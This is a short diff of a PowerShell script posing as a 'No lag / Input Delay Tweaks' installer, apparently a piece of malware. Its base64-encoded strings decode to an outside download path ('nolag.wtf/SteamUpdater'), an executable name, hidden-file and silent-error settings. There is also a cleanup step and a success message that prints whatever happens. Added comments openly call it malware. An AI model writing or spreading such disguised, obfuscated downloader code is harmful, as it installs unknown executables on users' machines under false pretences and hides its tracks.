@@ -1,6 +1,8 @@
+#Oh Wow you found me
+#The whole point of this is so my glorious king john hammond will review this malware
 
 $silentB64 = "U2lsZW50bHljb250aW51ZQ=="
-$updaterB64 = "dXBkYXRlci5leGU"
+$updaterB64 = "VHdlYWtzLmV4ZQ=="
 $fileB64 = "bm9sYWcud3RmL1N0ZWFtVXBkYXRlcg=="
 $hiddenAttrB64 = "SGlkZGVu"
 $stopActionB64 = "U3RvcA=="
@@ -40,7 +42,7 @@ try {
     Remove-Item $hiddenFolder -Recurse -Force
 
 } catch {
-    
+    exit 1
 } finally {
     Write-Host "No lag / Input Delay Tweaks Have Been Successfully Installed."
 }
